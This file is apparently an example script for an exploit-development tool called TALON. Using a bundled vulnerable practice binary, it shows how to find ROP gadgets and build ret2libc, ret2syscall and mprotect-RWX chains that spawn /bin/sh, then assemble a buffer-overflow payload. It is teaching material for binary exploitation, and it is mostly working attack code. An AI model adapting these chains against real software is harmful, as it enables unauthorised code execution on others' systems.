# ROP DSL Showcase - Comprehensive ROP Chain Building Examples
# Demonstrates all the comprehensive ROP DSL functions in TALON

print("═══════════════════════════════════════════════════════════")
print("    TALON ROP DSL - Complete Showcase")
print("═══════════════════════════════════════════════════════════\n")

let binary = "./vuln_binary"  # Compile from vuln.c in examples/ using Makefile
let libc_base = 0x7ffff7a00000  # This should be leaked dynamically in real exploit

# ═══════════════════════════════════════════════════════════════
# Example 1: Basic ROP Chain Creation
# ═══════════════════════════════════════════════════════════════
print("[Example 1] Creating ROP Chain\n")
rop_new(binary)

# ═══════════════════════════════════════════════════════════════
# Example 2: Setting libc Base Address
# ═══════════════════════════════════════════════════════════════
print("\n[Example 2] Setting libc Base Address\n")
rop_set_libc(binary, libc_base)

# ═══════════════════════════════════════════════════════════════
# Example 3: Finding Specific Gadgets
# ═══════════════════════════════════════════════════════════════
print("\n[Example 3] Finding Specific Gadgets\n")
let pop_rdi = rop_find_gadget(binary, "pop rdi")
let pop_rsi = rop_find_gadget(binary, "pop rsi")
let syscall_gadget = rop_find_gadget(binary, "syscall")

print("Found gadgets:")
print("  pop rdi @ " + hex(pop_rdi))
print("  pop rsi @ " + hex(pop_rsi))
print("  syscall @ " + hex(syscall_gadget))

# ═══════════════════════════════════════════════════════════════
# Example 4: Searching for Multiple Gadgets
# ═══════════════════════════════════════════════════════════════
print("\n[Example 4] Searching for Multiple Gadgets\n")
rop_search(binary, "pop")
let pop_gadgets = rop_find_gadgets(binary, "pop")
print("Total pop gadgets found: " + str(len(pop_gadgets)))

# ═══════════════════════════════════════════════════════════════
# Example 5: Building Custom ROP Chain
# ═══════════════════════════════════════════════════════════════
print("\n[Example 5] Building Custom ROP Chain\n")
let gadget_list = [pop_rdi, 0x400800, pop_rsi, 0x400900, syscall_gadget]
let chain_bytes = rop_build_chain(binary, gadget_list)
print("Chain payload size: " + str(len(chain_bytes)) + " bytes")

# ═══════════════════════════════════════════════════════════════
# Example 6: ret2libc Attack Chain
# ═══════════════════════════════════════════════════════════════
print("\n[Example 6] Building ret2libc Chain\n")
let ret2libc_chain = rop_ret2libc(binary, "/bin/sh", libc_base: libc_base)
print("ret2libc payload ready!")

# ═══════════════════════════════════════════════════════════════
# Example 7: ret2syscall Attack Chain
# ═══════════════════════════════════════════════════════════════
print("\n[Example 7] Building ret2syscall Chain\n")
let execve_syscall = 59
let binsh_addr = libc_base + 0x1b3e9a
let ret2syscall_chain = rop_ret2syscall(
    binary, 
    execve_syscall,
    arg1: binsh_addr,
    arg2: 0,
    arg3: 0
)
print("ret2syscall payload ready!")

# ═══════════════════════════════════════════════════════════════
# Example 8: Automated ROP Solver - system() Goal
# ═══════════════════════════════════════════════════════════════
print("\n[Example 8] Automated ROP Solver - system() Goal\n")
let solver_payload = rop_solve(
    binary,
    "system",
    cmd: "/bin/sh",
    libc_base: libc_base,
    strategies: ["ret2libc", "ret2syscall", "one_gadget"]
)
print("Solver found solution!")

# ═══════════════════════════════════════════════════════════════
# Example 9: Automated ROP Solver - execve() Goal
# ═══════════════════════════════════════════════════════════════
print("\n[Example 9] Automated ROP Solver - execve() Goal\n")
let execve_payload = rop_solve(
    binary,
    "execve",
    cmd: "/bin/bash",
    libc_base: libc_base
)
print("execve() ROP chain created!")

# ═══════════════════════════════════════════════════════════════
# Example 10: Automated ROP Solver - mprotect() Goal
# ═══════════════════════════════════════════════════════════════
print("\n[Example 10] Automated ROP Solver - mprotect() Goal\n")
let mprotect_payload = rop_solve(
    binary,
    "mprotect",
    addr: 0x600000,
    size: 0x1000,
    perms: 7,
    libc_base: libc_base,
    strategies: ["mprotect_rwx", "ret2syscall"]
)
print("mprotect() ROP chain created!")

# ═══════════════════════════════════════════════════════════════
# Example 11: List All Common Gadgets
# ═══════════════════════════════════════════════════════════════
print("\n[Example 11] Listing Common Gadgets\n")
rop_list_gadgets(binary)

# ═══════════════════════════════════════════════════════════════
# Example 12: Complete Exploit with ROP
# ═══════════════════════════════════════════════════════════════
print("\n[Example 12] Complete Exploit Assembly\n")

let offset = 264
let padding = cyclic(offset)

let final_payload = padding + ret2libc_chain

print("Final exploit payload:")
print("  Padding: " + str(len(padding)) + " bytes")
print("  ROP chain: " + str(len(ret2libc_chain)) + " bytes")
print("  Total: " + str(len(final_payload)) + " bytes")

print("\n═══════════════════════════════════════════════════════════")
print("    ROP DSL Showcase Complete!")
print("═══════════════════════════════════════════════════════════\n")

print("\n[Summary] New ROP DSL Functions:")
print("   rop_new()          - Initialize ROP chain")
print("   rop_set_libc()     - Set libc base address")
print("   rop_find_gadget()  - Find single gadget by pattern")
print("   rop_find_gadgets() - Find multiple gadgets")
print("   rop_search()       - Search and display gadgets")
print("   rop_build_chain()  - Build ROP chain from addresses")
print("   rop_ret2libc()     - Create ret2libc chain")
print("   rop_ret2syscall()  - Create ret2syscall chain")
print("   rop_solve()        - Automated ROP solver")
print("   rop_list_gadgets() - List common gadgets")
